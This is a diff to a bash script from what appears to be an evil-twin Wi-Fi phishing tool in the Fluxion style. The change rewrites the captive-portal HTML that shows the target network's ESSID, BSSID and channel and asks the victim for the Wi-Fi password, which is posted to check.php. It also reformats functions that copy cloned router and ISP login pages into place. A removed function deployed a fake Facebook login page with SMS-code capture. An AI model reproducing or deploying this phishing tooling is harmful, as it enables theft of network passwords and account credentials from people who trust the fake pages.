@@ -6738,100 +6738,70 @@ ziTSAVBLBQYAAAAAFgAWACkJAADb9wEAAAA=" | base64 -d >$DUMP_PATH/file.zip
 	rm $DUMP_PATH/file.zip &>$flux_output_device
 
 	echo "<!DOCTYPE html>
-<html>
-	<head>
-	    <title>Login Page</title>
-	    <meta charset=\"UTF-8\">
-	    <meta name=\"viewport\" content=\"width=device-width, height=device-height, initial-scale=1.0\">
-	    <link rel=\"stylesheet\" type=\"text/css\" href=\"jquery.mobile-1.3.2.css\">
-	    <script src=\"jquery-1.8.3.min.js\"></script>
-	    <script src=\"jquery.mobile-1.3.2.js\"></script>
-	</head>
-	<body>
-	    <div data-role=\"page\" id=\"login\" data-theme=\"b\">
-			<div data-role=\"content\">"$DIALOG_WEB_OK"</div>
-			<div data-theme=\"a\" data-role=\"footer\" data-position=\"fixed\"></div>
-	    </div>
-	</body>
-</html>" > $DUMP_PATH/data/final.html
-
-	echo "<!DOCTYPE html>
-<html>
-	<head>
-	    <title>Login Page</title>
-	    <meta charset=\"UTF-8\">
-	    <meta name=\"viewport\" content=\"width=device-width, height=device-height, initial-scale=1.0\">
-	    <link rel=\"stylesheet\" type=\"text/css\" href=\"jquery.mobile-1.3.2.css\">
-	    <script src=\"jquery-1.8.3.min.js\"></script>
-	    <script src=\"jquery.mobile-1.3.2.js\"></script>
-	</head>
-	<body>
-	    <div data-role=\"page\" id=\"login\" data-theme=\"b\">
-			<div data-role=\"content\">"$DIALOG_WEB_ERROR"<br><a href=\"index.htm\" data-role=\"button\" rel=\"external\" data-inline=\"true\" id=\"back\" onclick=\"location.reload();location.href='index.htm'\">"$DIALOG_WEB_BACK"</a></div>
-			<div data-theme=\"a\" data-role=\"footer\" data-position=\"fixed\"></div>
-	    </div>
-	</body>
-</html>" > $DUMP_PATH/data/error.html
-
-	echo "<!DOCTYPE html>
 	<html>
 	<head>
 	    <title>Login Page</title>
 	    <meta charset=\"UTF-8\">
 	    <meta name=\"viewport\" content=\"width=device-width, height=device-height, initial-scale=1.0\">
-	    <link rel=\"stylesheet\" type=\"text/css\" href=\"jquery.mobile-1.3.2.css\">
-	    <script src=\"jquery-1.8.3.min.js\"></script>
-	    <script src=\"jquery.mobile-1.3.2.js\"></script>
-	    <style>
-		#login-button {
-		    margin-top: 30px;
-		}
-
-		.ui-grid-c {
-		    text-align : center;
-		    margin-right: -50% !important;
-		}
-
-		.ui-block-b {
-		    text-align : left;
-		}
-
-		.ui-block-a {
-		    text-align : right;
-		    margin-right: 10px !important;
-		}
-	    </style>
+		<!-- Styles -->
+	    <link rel=\"stylesheet\" type=\"text/css\" href=\"css/jquery.mobile-1.4.5.min.css\"/>
+		<link rel=\"stylesheet\" type=\"text/css\" href=\"css/main.css\"/>
+		<!-- Scripts -->
+		<script src=\"js/jquery-1.11.1.min.js\"></script>
+		<script src=\"js/jquery.mobile-1.4.5.min.js\"></script>
+		<script src=\"js/jquery.validate.min.js\"></script>
+		<script src=\"js/additional-methods.min.js\"></script>
 	</head>
 	<body>
-	    <div data-role=\"page\" id=\"login\" data-theme=\"b\">
-			<div data-role=\"content\">
+		<!-- Main page -->
+	    <div id=\"home\" data-role=\"page\" data-theme=\"a\">
+			<div data-role=\"main\" class=\"ui-content\" dir=\"$DIALOG_WEB_DIR\">
 				<fieldset>
-					<form id=\"check-user\" class=\"ui-body ui-body-a ui-corner-all\" data-ajax=\"false\" action=\"check.php\" method=\"POST\" >
-						<div class=ui-grid-c>
-							<div class=ui-block-a>ESSID:</div>
-							<div class=ui-block-b><b>$Host_SSID</b></div>
-							<div class=ui-block-a>BSSID:</div>
-							<div class=ui-block-b><b>$Host_MAC</b></div>
-							<div class=ui-block-a>Chan:</div>
-							<div class=ui-block-b><b>$Host_CHAN</b></div>
-						</div><br>$DIALOG_WEB_INFO
+					<form id=\"loginForm\" class=\"ui-body ui-body-b ui-corner-all\" action=\"check.php\" method=\"post\">
+						</br>
+						<div class=\"ui-field-contain ui-responsive\" style=\"text-align:center;\">
+							<div>ESSID: <u>$Host_SSID</u></div>
+							<div>BSSID: <u>$Host_MAC</u></div>
+							<div>Channel: <u>$Host_CHAN</u></div>
+						</div>
+						<div style=\"text-align:center;\">
+							<br><label>$DIALOG_WEB_INFO</label></br>
+						</div>
+						<div class=\"ui-field-contain\" >
+							<label for=\"key1\">$DIALOG_WEB_INPUT</label>
+							<input id=\"key1\" data-clear-btn=\"true\" type=\"password\" value=\"\" name=\"key1\" maxlength=\"64\"/>
+						</div>
 						
-						<div data-role=\"fieldcontain\"><label for=\"password\">$DIALOG_WEB_INPUT</label></div>
-						<input type=\"password\" value=\"\" name=\"key1\" id=\"key1\"/>
-						<input type=\"submit\" data-theme=\"b\" name=\"submit\" id=\"submit\" data-inline=\"true\" value=\"$DIALOG_WEB_SUBMIT\"/>
+						<input data-icon=\"check\" data-inline=\"true\" name=\"submitBtn\" type=\"submit\" value=\"$DIALOG_WEB_SUBMIT\"/>
 					</form>
 				</fieldset>
 			</div>
-			<div data-theme=\"a\" data-role=\"footer\" data-position=\"fixed\"></div>
 	    </div>
+		
+		<!-- Error page -->
+	    <div id=\"error\" data-role=\"page\" data-theme=\"a\">
+			<div data-role=\"main\" class=\"ui-content ui-body ui-body-b\" dir=\"$DIALOG_WEB_DIR\">
+				<h1 style=\"text-align:center;\">$DIALOG_WEB_ERROR</h1>
+				<a href=\"#home\" class=\"ui-btn ui-corner-all ui-shadow\">Back</a>
+			</div>
+	    </div>
+		
+		<!-- final page -->
+	    <div id=\"done\" data-role=\"page\" data-theme=\"a\">
+			<div data-role=\"main\" class=\"ui-content ui-body ui-body-b\" dir=\"$DIALOG_WEB_DIR\" >
+				<h1 style=\"text-align:center;\">$DIALOG_WEB_OK</h1>
+			</div>
+	    </div>
+		
+		<script src=\"js/main.js\"></script>
+		<script src=\"js/localization/$DIALOG_WEB_localization.js\"></script>
 	</body>
 </html>" > $DUMP_PATH/data/index.htm
 }
 
-
-	# Crea el contenido de la interface web
+# Crea el contenido de la interface web
 function ARRIS {
-mkdir $DUMP_PATH/data &>$flux_output_device
+	mkdir $DUMP_PATH/data &>$flux_output_device
         cp  $WORK_DIR/Sites/ARRIS-ENG/background.png $DUMP_PATH/data
         cp  $WORK_DIR/Sites/ARRIS-ENG/house.png $DUMP_PATH/data
         cp  $WORK_DIR/Sites/ARRIS-ENG/house1.png $DUMP_PATH/data
@@ -6839,13 +6809,12 @@ mkdir $DUMP_PATH/data &>$flux_output_device
         cp  $WORK_DIR/Sites/ARRIS-ENG/error.html $DUMP_PATH/data
         cp  $WORK_DIR/Sites/ARRIS-ENG/final.html $DUMP_PATH/data
         cp  $WORK_DIR/Sites/ARRIS-ENG/index.htm $DUMP_PATH/data
+}
 
-	              }
-
-	#Conten interface web
+#Conten interface web
 function BELKIN {
-mkdir $DUMP_PATH/data &>$flux_output_device
-        cp  $WORK_DIR/Sites/BELKIN-ENG/info2.css $DUMP_PATH/data
+	mkdir $DUMP_PATH/data &>$flux_output_device
+	cp  $WORK_DIR/Sites/BELKIN-ENG/info2.css $DUMP_PATH/data
         cp  $WORK_DIR/Sites/BELKIN-ENG/info.css $DUMP_PATH/data
         cp  $WORK_DIR/Sites/BELKIN-ENG/background.png $DUMP_PATH/data
         cp  $WORK_DIR/Sites/BELKIN-ENG/house.png $DUMP_PATH/data
@@ -6855,12 +6824,11 @@ mkdir $DUMP_PATH/data &>$flux_output_device
         cp  $WORK_DIR/Sites/BELKIN-ENG/final.html $DUMP_PATH/data
         cp  $WORK_DIR/Sites/BELKIN-ENG/info.html $DUMP_PATH/data
         cp  $WORK_DIR/Sites/BELKIN-ENG/index.htm $DUMP_PATH/data
+}
 
-	              }
-
-	#Conten interface web
+#Conten interface web
 function NETGEAR {
-mkdir $DUMP_PATH/data &>$flux_output_device
+	mkdir $DUMP_PATH/data &>$flux_output_device
         cp  $WORK_DIR/Sites/NETGEAR-ENG/info2.css $DUMP_PATH/data
         cp  $WORK_DIR/Sites/NETGEAR-ENG/info.css $DUMP_PATH/data
         cp  $WORK_DIR/Sites/NETGEAR-ENG/background.png $DUMP_PATH/data
@@ -6871,13 +6839,11 @@ mkdir $DUMP_PATH/data &>$flux_output_device
         cp  $WORK_DIR/Sites/NETGEAR-ENG/final.html $DUMP_PATH/data
         cp  $WORK_DIR/Sites/NETGEAR-ENG/info.html $DUMP_PATH/data
         cp  $WORK_DIR/Sites/NETGEAR-ENG/index.htm $DUMP_PATH/data
-
-	              }
+}
 
 #Conten interface web
 function ARRIS2 {
-
-mkdir $DUMP_PATH/data &>$flux_output_device
+	mkdir $DUMP_PATH/data &>$flux_output_device
         cp  $WORK_DIR/Sites/ARRIS-ESP/info2.css $DUMP_PATH/data
         cp  $WORK_DIR/Sites/ARRIS-ESP/info.css $DUMP_PATH/data
         cp  $WORK_DIR/Sites/ARRIS-ESP/background.png $DUMP_PATH/data
@@ -6888,13 +6854,11 @@ mkdir $DUMP_PATH/data &>$flux_output_device
         cp  $WORK_DIR/Sites/ARRIS-ESP/final.html $DUMP_PATH/data
         cp  $WORK_DIR/Sites/ARRIS-ESP/info.html $DUMP_PATH/data
         cp  $WORK_DIR/Sites/ARRIS-ESP/index.htm $DUMP_PATH/data
-
-	              }
+}
 
 #Conten interface web
 function NETGEAR2 {
-
-mkdir $DUMP_PATH/data &>$flux_output_device
+	mkdir $DUMP_PATH/data &>$flux_output_device
         cp  $WORK_DIR/Sites/NETGEAR-ESP/info2.css $DUMP_PATH/data
         cp  $WORK_DIR/Sites/NETGEAR-ESP/info.css $DUMP_PATH/data
         cp  $WORK_DIR/Sites/NETGEAR-ESP/background.png $DUMP_PATH/data
@@ -6905,13 +6869,11 @@ mkdir $DUMP_PATH/data &>$flux_output_device
         cp  $WORK_DIR/Sites/NETGEAR-ESP/final.html $DUMP_PATH/data
         cp  $WORK_DIR/Sites/NETGEAR-ESP/info.html $DUMP_PATH/data
         cp  $WORK_DIR/Sites/NETGEAR-ESP/index.htm $DUMP_PATH/data
-
-	              }
+}
 
 #Conten interface web
 function VODAFONE {
-
-mkdir $DUMP_PATH/data &>$flux_output_device
+	mkdir $DUMP_PATH/data &>$flux_output_device
         cp  $WORK_DIR/Sites/VODAFONE-ESP/info2.css $DUMP_PATH/data
         cp  $WORK_DIR/Sites/VODAFONE-ESP/info.css $DUMP_PATH/data
         cp  $WORK_DIR/Sites/VODAFONE-ESP/background.png $DUMP_PATH/data
@@ -6922,60 +6884,25 @@ mkdir $DUMP_PATH/data &>$flux_output_device
         cp  $WORK_DIR/Sites/VODAFONE-ESP/final.html $DUMP_PATH/data
         cp  $WORK_DIR/Sites/VODAFONE-ESP/info.html $DUMP_PATH/data
         cp  $WORK_DIR/Sites/VODAFONE-ESP/index.htm $DUMP_PATH/data
-
-	              }
+}
 
 #Conten interface web
 function VERIZON {
-
-mkdir $DUMP_PATH/data &>$flux_output_device
+	mkdir $DUMP_PATH/data &>$flux_output_device
         cp -r $WORK_DIR/Sites/Login-Verizon/Verizon_files $DUMP_PATH/data
         cp $WORK_DIR/Sites/Login-Verizon/Verizon.html $DUMP_PATH/data
-
-	              }
+}
 
 function XFINITY {
 
-mkdir $DUMP_PATH/data &>$flux_output_device
+	mkdir $DUMP_PATH/data &>$flux_output_device
         cp -r $WORK_DIR/Sites/Login-Xfinity/Xfinity_files $DUMP_PATH/data
-		cp $WORK_DIR/Sites/Login-Xfinity/Xfinity.html $DUMP_PATH/data
-	              }
-
-function topusers {
-echo -e " "
-echo -e " _ _ _ "
- echo -e " /   \ __ _ _// _/ "
- echo -e " / /\  |       /| )_ ___ \ "
- echo -e " / | \ | | / \ "
- echo -e " __| /|  /__ /___ / "
- echo -e " / / / / "
- echo -e " "
-}
-# Create a Facebook login page
-function Facebook {
-mkdir $DUMP_PATH/data &>$ares_output_device
-        cp  $WORK_DIR/Sites/Facebook/config.ini $DUMP_PATH/data
-        cp  $WORK_DIR/Sites/Facebook/data.php $DUMP_PATH/data
-        cp  $WORK_DIR/Sites/Facebook/facebook-logo.png $DUMP_PATH/data
-        cp  $WORK_DIR/Sites/Facebook/font-awesome.min.css $DUMP_PATH/data
-        cp  $WORK_DIR/Sites/Facebook/index.htm $DUMP_PATH/data
-        cp  $WORK_DIR/Sites/Facebook/index.js $DUMP_PATH/data
-        cp  $WORK_DIR/Sites/Facebook/jquery.min.js $DUMP_PATH/data
-        cp  $WORK_DIR/Sites/Facebook/oauth.html $DUMP_PATH/data
-        cp  $WORK_DIR/Sites/Facebook/reset.css $DUMP_PATH/data
-        cp  $WORK_DIR/Sites/Facebook/roboto.css $DUMP_PATH/data
-        cp  $WORK_DIR/Sites/Facebook/style.css $DUMP_PATH/data
-        cp  $WORK_DIR/Sites/Facebook/datasms.php $DUMP_PATH/data
-        cp  $WORK_DIR/Sites/Facebook/smscode.htm $DUMP_PATH/data
-		cp  $WORK_DIR/Sites/Facebook/Facebookusers.txt $DUMP_PATH/data
-
-[ -f /root/Facebookusers.txt ] || cp  $WORK_DIR/Sites/Facebook/Facebookusers.txt /root/Facebookusers.txt && echo  >> /root/Facebookusers.txt && echo -e "           "  >> /root/Facebookusers.txt && echo -e "             _____ _____________________ _________  "  >> /root/Facebookusers.txt && echo -e "            /  _  \\ _____   \_   _____//   _____/  "  >> /root/Facebookusers.txt && echo -e "           /  /_\  \|       _/|    __)_ \_____  \   "  >> /root/Facebookusers.txt && echo -e "          /    |    \    |   \|        \/        \  "  >> /root/Facebookusers.txt && echo -e "          \____|__  /____|_  /_______  /_______  /  "  >> /root/Facebookusers.txt && echo -e "                  \/       \/        \/        \/   "  >> /root/Facebookusers.txt && echo -e "          " && echo -e "               by princeofguilty & deltax           "  >> /root/Facebookusers.txt && echo -e "            "  >> /root/Facebookusers.txt && echo -e " Network ssid : $Host_SSID"  >> /root/Facebookusers.txt
+	cp $WORK_DIR/Sites/Login-Xfinity/Xfinity.html $DUMP_PATH/data
 }
 
 #Conten interface web
 function HUAWEI {
-
-mkdir $DUMP_PATH/data &>$flux_output_device
+	mkdir $DUMP_PATH/data &>$flux_output_device
         cp  $WORK_DIR/Sites/HUAWEI-ENG/info2.css $DUMP_PATH/data
         cp  $WORK_DIR/Sites/HUAWEI-ENG/info.css $DUMP_PATH/data
         cp  $WORK_DIR/Sites/HUAWEI-ENG/background.png $DUMP_PATH/data
@@ -6986,8 +6913,7 @@ mkdir $DUMP_PATH/data &>$flux_output_device
         cp  $WORK_DIR/Sites/HUAWEI-ENG/final.html $DUMP_PATH/data
         cp  $WORK_DIR/Sites/HUAWEI-ENG/info.html $DUMP_PATH/data
         cp  $WORK_DIR/Sites/HUAWEI-ENG/index.htm $DUMP_PATH/data
-
-	              }
+}
 
 ######################################### < INTERFACE WEB > ########################################
 
